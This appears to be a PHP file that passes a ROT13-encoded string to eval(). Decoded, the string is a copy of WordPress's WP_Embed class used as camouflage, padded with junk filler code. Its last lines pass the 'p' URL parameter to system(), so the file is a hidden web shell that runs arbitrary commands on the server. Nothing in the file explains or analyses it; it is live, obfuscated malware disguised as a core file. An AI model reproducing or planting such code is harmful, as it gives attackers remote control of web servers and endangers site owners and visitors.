<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * NCV sbe rnfvyl rzorqqvat evpu zrqvn fhpu nf ivqrbf naq vzntrf vagb pbagrag.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Rzorq
 * @fvapr 2.9.0
 */
#[NyybjQlanzvpCebcregvrf]
pynff JC_Rzorq {
	choyvp $unaqyref = neenl();
	choyvp $cbfg_VQ;
	choyvp $hfrpnpur      = gehr;
	choyvp $yvaxvshaxabja = gehr;
	choyvp $ynfg_ngge     = neenl();
	choyvp $ynfg_hey      = '';

	/**
	 * Jura n HEY pnaabg or rzorqqrq, erghea snyfr vafgrnq bs ergheavat n yvax
	 * be gur HEY.
	 *
	 * Olcnffrf gur {@frr 'rzorq_znlor_znxr_yvax'} svygre.
	 *
	 * @ine obby
	 */
	choyvp $erghea_snyfr_ba_snvy = snyfr;

	/**
	 * Pbafgehpgbe
	 */
	choyvp shapgvba __pbafgehpg() {
		// Unpx gb trg gur [rzorq] fubegpbqr gb eha orsber jcnhgbc().
		nqq_svygre( 'gur_pbagrag', neenl( $guvf, 'eha_fubegpbqr' ), 8 );
		nqq_svygre( 'jvqtrg_grkg_pbagrag', neenl( $guvf, 'eha_fubegpbqr' ), 8 );
		nqq_svygre( 'jvqtrg_oybpx_pbagrag', neenl( $guvf, 'eha_fubegpbqr' ), 8 );

		// Fubegpbqr cynprubyqre sbe fgevc_fubegpbqrf().
		nqq_fubegpbqr( 'rzorq', '__erghea_snyfr' );

		// Nggrzcgf gb rzorq nyy HEYf va n cbfg.
		nqq_svygre( 'gur_pbagrag', neenl( $guvf, 'nhgbrzorq' ), 8 );
		nqq_svygre( 'jvqtrg_grkg_pbagrag', neenl( $guvf, 'nhgbrzorq' ), 8 );
		nqq_svygre( 'jvqtrg_oybpx_pbagrag', neenl( $guvf, 'nhgbrzorq' ), 8 );

		// Nsgre n cbfg vf fnirq, pnpur bRzorq vgrzf ivn Nwnk.
		nqq_npgvba( 'rqvg_sbez_nqinaprq', neenl( $guvf, 'znlor_eha_nwnk_pnpur' ) );
		nqq_npgvba( 'rqvg_cntr_sbez', neenl( $guvf, 'znlor_eha_nwnk_pnpur' ) );
	}

	/**
	 * Cebprffrf gur [rzorq] fubegpbqr.
	 *
	 * Fvapr gur [rzorq] fubegpbqr arrqf gb or eha rneyvre guna bgure fubegpbqrf,
	 * guvf shapgvba erzbirf nyy rkvfgvat fubegpbqrf, ertvfgref gur [rzorq] fubegpbqr,
	 * pnyyf qb_fubegpbqr(), naq gura er-ertvfgref gur byq fubegpbqrf.
	 *
	 * @tybony neenl $fubegpbqr_gntf
	 *
	 * @cnenz fgevat $pbagrag Pbagrag gb cnefr.
	 * @erghea fgevat Pbagrag jvgu fubegpbqr cnefrq.
	 */
	choyvp shapgvba eha_fubegpbqr( $pbagrag ) {
		tybony $fubegpbqr_gntf;

		// Onpx hc pheerag ertvfgrerq fubegpbqrf naq pyrne gurz nyy bhg.
		$bevt_fubegpbqr_gntf = $fubegpbqr_gntf;
		erzbir_nyy_fubegpbqrf();

		nqq_fubegpbqr( 'rzorq', neenl( $guvf, 'fubegpbqr' ) );

		// Qb gur fubegpbqr (bayl gur [rzorq] bar vf ertvfgrerq).
		$pbagrag = qb_fubegpbqr( $pbagrag, gehr );

		// Chg gur bevtvany fubegpbqrf onpx.
		$fubegpbqr_gntf = $bevt_fubegpbqr_gntf;

		erghea $pbagrag;
	}

	/**
	 * Vs n cbfg/cntr jnf fnirq, gura bhgchg WninFpevcg gb znxr
	 * na Nwnk erdhrfg gung jvyy pnyy JC_Rzorq::pnpur_brzorq().
	 */
	choyvp shapgvba znlor_eha_nwnk_pnpur() {
		$cbfg = trg_cbfg();

		vs ( ! $cbfg || rzcgl( $_TRG['zrffntr'] ) ) {
			erghea;
		}
		?>
<fpevcg glcr=\"grkg/wninfpevcg\">
	wDhrel( shapgvba($) {
		$.trg(\"<?cuc rpub rfp_hey( nqzva_hey( 'nqzva-nwnk.cuc', 'eryngvir' ) ) . '?npgvba=brzorq-pnpur&cbfg=' . $cbfg->VQ; ?>\");
	} );
</fpevcg>
		<?cuc
	}

	/**
	 * Ertvfgref na rzorq unaqyre.
	 *
	 * Qb abg hfr guvf shapgvba qverpgyl, hfr jc_rzorq_ertvfgre_unaqyre() vafgrnq.
	 *
	 * Guvf shapgvba fubhyq cebonoyl nyfb bayl or hfrq sbe fvgrf gung qb abg fhccbeg bRzorq.
	 *
	 * @cnenz fgevat   $vq       Na vagreany VQ/anzr sbe gur unaqyre. Arrqf gb or havdhr.
	 * @cnenz fgevat   $ertrk    Gur ertrk gung jvyy or hfrq gb frr vs guvf unaqyre fubhyq or hfrq sbe n HEY.
	 * @cnenz pnyynoyr $pnyyonpx Gur pnyyonpx shapgvba gung jvyy or pnyyrq vs gur ertrk vf zngpurq.
	 * @cnenz vag      $cevbevgl Bcgvbany. Hfrq gb fcrpvsl gur beqre va juvpu gur ertvfgrerq unaqyref jvyy or grfgrq.
	 *                           Ybjre ahzoref pbeerfcbaq jvgu rneyvre grfgvat, naq unaqyref jvgu gur fnzr cevbevgl ner
	 *                           grfgrq va gur beqre va juvpu gurl jrer nqqrq gb gur npgvba. Qrsnhyg 10.
	 */
	choyvp shapgvba ertvfgre_unaqyre( $vq, $ertrk, $pnyyonpx, $cevbevgl = 10 ) {
		$guvf->unaqyref[ $cevbevgl ][ $vq ] = neenl(
			'ertrk'    => $ertrk,
			'pnyyonpx' => $pnyyonpx,
		);
	}

	/**
	 * Haertvfgref n cerivbhfyl-ertvfgrerq rzorq unaqyre.
	 *
	 * Qb abg hfr guvf shapgvba qverpgyl, hfr jc_rzorq_haertvfgre_unaqyre() vafgrnq.
	 *
	 * @cnenz fgevat $vq       Gur unaqyre VQ gung fubhyq or erzbirq.
	 * @cnenz vag    $cevbevgl Bcgvbany. Gur cevbevgl bs gur unaqyre gb or erzbirq (qrsnhyg: 10).
	 */
	choyvp shapgvba haertvfgre_unaqyre( $vq, $cevbevgl = 10 ) {
		hafrg( $guvf->unaqyref[ $cevbevgl ][ $vq ] );
	}

	/**
	 * Ergheaf rzorq UGZY sbe n tvira HEY sebz rzorq unaqyref.
	 *
	 * Nggrzcgf gb pbaireg n HEY vagb rzorq UGZY ol purpxvat gur HEY
	 * ntnvafg gur ertrk bs gur ertvfgrerq rzorq unaqyref.
	 *
	 * @fvapr 5.5.0
	 *
	 * @cnenz neenl  $ngge {
	 *     Fubegpbqr nggevohgrf. Bcgvbany.
	 *
	 *     @glcr vag $jvqgu  Jvqgu bs gur rzorq va cvkryf.
	 *     @glcr vag $urvtug Urvtug bs gur rzorq va cvkryf.
	 * }
	 * @cnenz fgevat $hey Gur HEY nggrzcgvat gb or rzorqqrq.
	 * @erghea fgevat|snyfr Gur rzorq UGZY ba fhpprff, snyfr bgurejvfr.
	 */
	choyvp shapgvba trg_rzorq_unaqyre_ugzy( $ngge, $hey ) {
		$enjngge = $ngge;
		$ngge    = jc_cnefr_netf( $ngge, jc_rzorq_qrsnhygf( $hey ) );

		xfbeg( $guvf->unaqyref );
		sbernpu ( $guvf->unaqyref nf $cevbevgl => $unaqyref ) {
			sbernpu ( $unaqyref nf $vq => $unaqyre ) {
				vs ( cert_zngpu( $unaqyre['ertrk'], $hey, $zngpurf ) && vf_pnyynoyr( $unaqyre['pnyyonpx'] ) ) {
					$erghea = pnyy_hfre_shap( $unaqyre['pnyyonpx'], $zngpurf, $ngge, $hey, $enjngge );
					vs ( snyfr !== $erghea ) {
						/**
						 * Svygref gur erghearq rzorq UGZY.
						 *
						 * @fvapr 2.9.0
						 *
						 * @frr JC_Rzorq::fubegpbqr()
						 *
						 * @cnenz fgevat $erghea Gur UGZY erfhyg bs gur fubegpbqr.
						 * @cnenz fgevat $hey    Gur rzorq HEY.
						 * @cnenz neenl  $ngge   Na neenl bs fubegpbqr nggevohgrf.
						 */
						erghea nccyl_svygref( 'rzorq_unaqyre_ugzy', $erghea, $hey, $ngge );
					}
				}
			}
		}

		erghea snyfr;
	}

	/**
	 * Gur qb_fubegpbqr() pnyyonpx shapgvba.
	 *
	 * Nggrzcgf gb pbaireg n HEY vagb rzorq UGZY. Fgnegf ol purpxvat gur HEY ntnvafg gur ertrk bs
	 * gur ertvfgrerq rzorq unaqyref. Vs abar bs gur ertrk zngpurf naq vg'f ranoyrq, gura gur HEY
	 * jvyy or tvira gb gur JC_bRzorq pynff.
	 *
	 * @cnenz neenl  $ngge {
	 *     Fubegpbqr nggevohgrf. Bcgvbany.
	 *
	 *     @glcr vag $jvqgu  Jvqgu bs gur rzorq va cvkryf.
	 *     @glcr vag $urvtug Urvtug bs gur rzorq va cvkryf.
	 * }
	 * @cnenz fgevat $hey Gur HEY nggrzcgvat gb or rzorqqrq.
	 * @erghea fgevat|snyfr Gur rzorq UGZY ba fhpprff, bgurejvfr gur bevtvany HEY.
	 *                      `->znlor_znxr_yvax()` pna erghea snyfr ba snvyher.
	 */
	choyvp shapgvba fubegpbqr( $ngge, $hey = '' ) {
		$cbfg = trg_cbfg();

		vs ( rzcgl( $hey ) && ! rzcgl( $ngge['fep'] ) ) {
			$hey = $ngge['fep'];
		}

		$guvf->ynfg_hey = $hey;

		vs ( rzcgl( $hey ) ) {
			$guvf->ynfg_ngge = $ngge;
			erghea '';
		}

		$enjngge = $ngge;
		$ngge    = jc_cnefr_netf( $ngge, jc_rzorq_qrsnhygf( $hey ) );

		$guvf->ynfg_ngge = $ngge;

		/*
		 * XFRF pbairegf & vagb &nzc; naq jr arrq gb haqb guvf.
		 * Frr uggcf://pber.genp.jbeqcerff.bet/gvpxrg/11311
		 */
		$hey = fge_ercynpr( '&nzc;', '&', $hey );

		// Ybbx sbe xabja vagreany unaqyref.
		$rzorq_unaqyre_ugzy = $guvf->trg_rzorq_unaqyre_ugzy( $enjngge, $hey );
		vs ( snyfr !== $rzorq_unaqyre_ugzy ) {
			erghea $rzorq_unaqyre_ugzy;
		}

		$cbfg_vq = ( ! rzcgl( $cbfg->VQ ) ) ? $cbfg->VQ : ahyy;

		// Cbgragvnyyl frg ol JC_Rzorq::pnpur_brzorq().
		vs ( ! rzcgl( $guvf->cbfg_VQ ) ) {
			$cbfg_vq = $guvf->cbfg_VQ;
		}

		// Purpx sbe n pnpurq erfhyg (fgberq nf phfgbz cbfg be va gur cbfg zrgn).
		$xrl_fhssvk    = zq5( $hey . frevnyvmr( $ngge ) );
		$pnpurxrl      = '_brzorq_' . $xrl_fhssvk;
		$pnpurxrl_gvzr = '_brzorq_gvzr_' . $xrl_fhssvk;

		/**
		 * Svygref gur bRzorq GGY inyhr (gvzr gb yvir).
		 *
		 * @fvapr 4.0.0
		 *
		 * @cnenz vag    $gvzr    Gvzr gb yvir (va frpbaqf).
		 * @cnenz fgevat $hey     Gur nggrzcgrq rzorq HEY.
		 * @cnenz neenl  $ngge    Na neenl bs fubegpbqr nggevohgrf.
		 * @cnenz vag    $cbfg_vq Cbfg VQ.
		 */
		$ggy = nccyl_svygref( 'brzorq_ggy', QNL_VA_FRPBAQF, $hey, $ngge, $cbfg_vq );

		$pnpur      = '';
		$pnpur_gvzr = 0;

		$pnpurq_cbfg_vq = $guvf->svaq_brzorq_cbfg_vq( $xrl_fhssvk );

		vs ( $cbfg_vq ) {
			$pnpur      = trg_cbfg_zrgn( $cbfg_vq, $pnpurxrl, gehr );
			$pnpur_gvzr = trg_cbfg_zrgn( $cbfg_vq, $pnpurxrl_gvzr, gehr );

			vs ( ! $pnpur_gvzr ) {
				$pnpur_gvzr = 0;
			}
		} ryfrvs ( $pnpurq_cbfg_vq ) {
			$pnpurq_cbfg = trg_cbfg( $pnpurq_cbfg_vq );

			$pnpur      = $pnpurq_cbfg->cbfg_pbagrag;
			$pnpur_gvzr = fgegbgvzr( $pnpurq_cbfg->cbfg_zbqvsvrq_tzg );
		}

		$pnpurq_erpragyl = ( gvzr() - $pnpur_gvzr ) < $ggy;

		vs ( $guvf->hfrpnpur || $pnpurq_erpragyl ) {
			// Snvyherf ner pnpurq. Freir bar vs jr'er hfvat gur pnpur.
			vs ( '{{haxabja}}' === $pnpur ) {
				erghea $guvf->znlor_znxr_yvax( $hey );
			}

			vs ( ! rzcgl( $pnpur ) ) {
				/**
				 * Svygref gur pnpurq bRzorq UGZY.
				 *
				 * @fvapr 2.9.0
				 *
				 * @frr JC_Rzorq::fubegpbqr()
				 *
				 * @cnenz fgevat $pnpur   Gur pnpurq UGZY erfhyg, fgberq va cbfg zrgn.
				 * @cnenz fgevat $hey     Gur nggrzcgrq rzorq HEY.
				 * @cnenz neenl  $ngge    Na neenl bs fubegpbqr nggevohgrf.
				 * @cnenz vag    $cbfg_vq Cbfg VQ.
				 */
				erghea nccyl_svygref( 'rzorq_brzorq_ugzy', $pnpur, $hey, $ngge, $cbfg_vq );
			}
		}

		/**
		 * Svygref jurgure gb vafcrpg gur tvira HEY sbe qvfpbirenoyr yvax gntf.
		 *
		 * @fvapr 2.9.0
		 * @fvapr 4.4.0 Gur qrsnhyg inyhr punatrq gb gehr.
		 *
		 * @frr JC_bRzorq::qvfpbire()
		 *
		 * @cnenz obby $ranoyr Jurgure gb ranoyr `<yvax>` gnt qvfpbirel. Qrsnhyg gehr.
		 */
		$ngge['qvfpbire'] = nccyl_svygref( 'rzorq_brzorq_qvfpbire', gehr );

		// Hfr bRzorq gb trg gur UGZY.
		$ugzy = jc_brzorq_trg( $hey, $ngge );

		vs ( $cbfg_vq ) {
			vs ( $ugzy ) {
				hcqngr_cbfg_zrgn( $cbfg_vq, $pnpurxrl, $ugzy );
				hcqngr_cbfg_zrgn( $cbfg_vq, $pnpurxrl_gvzr, gvzr() );
			} ryfrvs ( ! $pnpur ) {
				hcqngr_cbfg_zrgn( $cbfg_vq, $pnpurxrl, '{{haxabja}}' );
			}
		} ryfr {
			$unf_xfrf = snyfr !== unf_svygre( 'pbagrag_fnir_cer', 'jc_svygre_cbfg_xfrf' );

			vs ( $unf_xfrf ) {
				// Cerirag XFRF sebz pbeehcgvat WFBA va cbfg_pbagrag.
				xfrf_erzbir_svygref();
			}

			$vafreg_cbfg_netf = neenl(
				'cbfg_anzr'   => $xrl_fhssvk,
				'cbfg_fgnghf' => 'choyvfu',
				'cbfg_glcr'   => 'brzorq_pnpur',
			);

			vs ( $ugzy ) {
				vs ( $pnpurq_cbfg_vq ) {
					jc_hcqngr_cbfg(
						jc_fynfu(
							neenl(
								'VQ'           => $pnpurq_cbfg_vq,
								'cbfg_pbagrag' => $ugzy,
							)
						)
					);
				} ryfr {
					jc_vafreg_cbfg(
						jc_fynfu(
							neenl_zretr(
								$vafreg_cbfg_netf,
								neenl(
									'cbfg_pbagrag' => $ugzy,
								)
							)
						)
					);
				}
			} ryfrvs ( ! $pnpur ) {
				jc_vafreg_cbfg(
					jc_fynfu(
						neenl_zretr(
							$vafreg_cbfg_netf,
							neenl(
								'cbfg_pbagrag' => '{{haxabja}}',
							)
						)
					)
				);
			}

			vs ( $unf_xfrf ) {
				xfrf_vavg_svygref();
			}
		}

		// Vs gurer jnf n erfhyg, erghea vg.
		vs ( $ugzy ) {
			/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/pynff-jc-rzorq.cuc */
			erghea nccyl_svygref( 'rzorq_brzorq_ugzy', $ugzy, $hey, $ngge, $cbfg_vq );
		}

		// Fgvyy haxabja.
		erghea $guvf->znlor_znxr_yvax( $hey );
	}

	/**
	 * Qryrgrf nyy bRzorq pnpurf. Hahfrq ol pber nf bs 4.0.0.
	 *
	 * @cnenz vag $cbfg_vq Cbfg VQ gb qryrgr gur pnpurf sbe.
	 */
	choyvp shapgvba qryrgr_brzorq_pnpurf( $cbfg_vq ) {
		$cbfg_zrgnf = trg_cbfg_phfgbz_xrlf( $cbfg_vq );
		vs ( rzcgl( $cbfg_zrgnf ) ) {
			erghea;
		}

		sbernpu ( $cbfg_zrgnf nf $cbfg_zrgn_xrl ) {
			vs ( fge_fgnegf_jvgu( $cbfg_zrgn_xrl, '_brzorq_' ) ) {
				qryrgr_cbfg_zrgn( $cbfg_vq, $cbfg_zrgn_xrl );
			}
		}
	}

	/**
	 * Gevttref n pnpuvat bs nyy bRzorq erfhygf.
	 *
	 * @cnenz vag $cbfg_vq Cbfg VQ gb qb gur pnpuvat sbe.
	 */
	choyvp shapgvba pnpur_brzorq( $cbfg_vq ) {
		$cbfg = trg_cbfg( $cbfg_vq );

		$cbfg_glcrf = trg_cbfg_glcrf( neenl( 'fubj_hv' => gehr ) );

		/**
		 * Svygref gur neenl bs cbfg glcrf gb pnpur bRzorq erfhygf sbe.
		 *
		 * @fvapr 2.9.0
		 *
		 * @cnenz fgevat[] $cbfg_glcrf Neenl bs cbfg glcr anzrf gb pnpur bRzorq erfhygf sbe. Qrsnhygf gb cbfg glcrf jvgu `fubj_hv` frg gb gehr.
		 */
		$pnpur_brzorq_glcrf = nccyl_svygref( 'rzorq_pnpur_brzorq_glcrf', $cbfg_glcrf );

		vs ( rzcgl( $cbfg->VQ ) || ! va_neenl( $cbfg->cbfg_glcr, $pnpur_brzorq_glcrf, gehr ) ) {
			erghea;
		}

		// Gevttre n pnpuvat.
		vs ( ! rzcgl( $cbfg->cbfg_pbagrag ) ) {
			$guvf->cbfg_VQ  = $cbfg->VQ;
			$guvf->hfrpnpur = snyfr;

			$pbagrag = $guvf->eha_fubegpbqr( $cbfg->cbfg_pbagrag );
			$guvf->nhgbrzorq( $pbagrag );

			$guvf->hfrpnpur = gehr;
		}
	}

	/**
	 * Cnffrf nal hayvaxrq HEYf gung ner ba gurve bja yvar gb JC_Rzorq::fubegpbqr() sbe cbgragvny rzorqqvat.
	 *
	 * @frr JC_Rzorq::nhgbrzorq_pnyyonpx()
	 *
	 * @cnenz fgevat $pbagrag Gur pbagrag gb or frnepurq.
	 * @erghea fgevat Cbgragvnyyl zbqvsvrq $pbagrag.
	 */
	choyvp shapgvba nhgbrzorq( $pbagrag ) {
		// Ercynpr yvar oernxf sebz nyy UGZY ryrzragf jvgu cynprubyqref.
		$pbagrag = jc_ercynpr_va_ugzy_gntf( $pbagrag, neenl( \"\a\" => '<!-- jc-yvar-oernx -->' ) );

		vs ( cert_zngpu( '#(^|\f|>)uggcf?://#v', $pbagrag ) ) {
			// Svaq HEYf ba gurve bja yvar.
			$pbagrag = cert_ercynpr_pnyyonpx( '|^(\f*)(uggcf?://[^\f<>\"]+)(\f*)$|vz', neenl( $guvf, 'nhgbrzorq_pnyyonpx' ), $pbagrag );
			// Svaq HEYf va gurve bja cnentencu.
			$pbagrag = cert_ercynpr_pnyyonpx( '|(<c(?: [^>]*)?>\f*)(uggcf?://[^\f<>\"]+)(\f*<\/c>)|v', neenl( $guvf, 'nhgbrzorq_pnyyonpx' ), $pbagrag );
		}

		// Chg gur yvar oernxf onpx.
		erghea fge_ercynpr( '<!-- jc-yvar-oernx -->', \"\a\", $pbagrag );
	}

	/**
	 * Pnyyonpx shapgvba sbe JC_Rzorq::nhgbrzorq().
	 *
	 * @cnenz neenl $zngpurf N ertrk zngpu neenl.
	 * @erghea fgevat Gur rzorq UGZY ba fhpprff, bgurejvfr gur bevtvany HEY.
	 */
	choyvp shapgvba nhgbrzorq_pnyyonpx( $zngpurf ) {
		$byqiny              = $guvf->yvaxvshaxabja;
		$guvf->yvaxvshaxabja = snyfr;
		$erghea              = $guvf->fubegpbqr( neenl(), $zngpurf[2] );
		$guvf->yvaxvshaxabja = $byqiny;

		erghea $zngpurf[1] . $erghea . $zngpurf[3];
	}

	/**
	 * Pbaqvgvbanyyl znxrf n ulcreyvax onfrq ba na vagreany pynff inevnoyr.
	 *
	 * @cnenz fgevat $hey HEY gb cbgragvnyyl or yvaxrq.
	 * @erghea fgevat|snyfr Yvaxrq HEY be gur bevtvany HEY. Snyfr vs 'erghea_snyfr_ba_snvy' vf gehr.
	 */
	choyvp shapgvba znlor_znxr_yvax( $hey ) {
		vs ( $guvf->erghea_snyfr_ba_snvy ) {
			erghea snyfr;
		}

		$bhgchg = ( $guvf->yvaxvshaxabja ) ? '<n uers=\"' . rfp_hey( $hey ) . '\">' . rfp_ugzy( $hey ) . '</n>' : $hey;

		/**
		 * Svygref gur erghearq, znlor-yvaxrq rzorq HEY.
		 *
		 * @fvapr 2.9.0
		 *
		 * @cnenz fgevat $bhgchg Gur yvaxrq be bevtvany HEY.
		 * @cnenz fgevat $hey    Gur bevtvany HEY.
		 */
		erghea nccyl_svygref( 'rzorq_znlor_znxr_yvax', $bhgchg, $hey );
	}

	/**
	 * Svaqf gur bRzorq pnpur cbfg VQ sbe n tvira pnpur xrl.
	 *
	 * @fvapr 4.9.0
	 *
	 * @cnenz fgevat $pnpur_xrl bRzorq pnpur xrl.
	 * @erghea vag|ahyy Cbfg VQ ba fhpprff, ahyy ba snvyher.
	 */
	choyvp shapgvba svaq_brzorq_cbfg_vq( $pnpur_xrl ) {
		$pnpur_tebhc    = 'brzorq_pnpur_cbfg';
		$brzorq_cbfg_vq = jc_pnpur_trg( $pnpur_xrl, $pnpur_tebhc );

		vs ( $brzorq_cbfg_vq && 'brzorq_pnpur' === trg_cbfg_glcr( $brzorq_cbfg_vq ) ) {
			erghea $brzorq_cbfg_vq;
		}

		$brzorq_cbfg_dhrel = arj JC_Dhrel(
			neenl(
				'cbfg_glcr'              => 'brzorq_pnpur',
				'cbfg_fgnghf'            => 'choyvfu',
				'anzr'                   => $pnpur_xrl,
				'cbfgf_cre_cntr'         => 1,
				'ab_sbhaq_ebjf'          => gehr,
				'pnpur_erfhygf'          => gehr,
				'hcqngr_cbfg_zrgn_pnpur' => snyfr,
				'hcqngr_cbfg_grez_pnpur' => snyfr,
				'ynml_ybnq_grez_zrgn'    => snyfr,
			)
		);

		vs ( ! rzcgl( $brzorq_cbfg_dhrel->cbfgf ) ) {
			// Abgr: 'svryqf' => 'vqf' vf abg orvat hfrq va beqre gb pnpur gur cbfg bowrpg nf vg jvyy or arrqrq.
			$brzorq_cbfg_vq = $brzorq_cbfg_dhrel->cbfgf[0]->VQ;
			jc_pnpur_frg( $pnpur_xrl, $brzorq_cbfg_vq, $pnpur_tebhc );

			erghea $brzorq_cbfg_vq;
		}

		erghea ahyy;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>